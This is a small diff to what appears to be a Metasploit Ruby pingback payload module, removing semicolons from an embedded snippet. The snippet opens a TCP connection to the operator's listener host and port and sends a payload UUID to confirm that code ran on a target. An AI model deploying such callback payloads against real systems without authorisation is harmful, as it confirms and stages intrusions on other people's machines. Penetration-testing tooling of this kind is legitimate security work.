@@ -38,10 +38,10 @@ module MetasploitModule
     lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
 
     ruby_code = <<~RUBY
-      require 'socket';
-      c=TCPSocket.new("#{lhost}", #{datastore['LPORT'].to_i});
-      c.puts('#{self.pingback_uuid}'.scan(/../).map { |x| x.hex.chr }.join);
-      c.close;
+      require 'socket'
+      c=TCPSocket.new("#{lhost}", #{datastore['LPORT'].to_i})
+      c.puts('#{self.pingback_uuid}'.scan(/../).map { |x| x.hex.chr }.join)
+      c.close
     RUBY
   end
 end
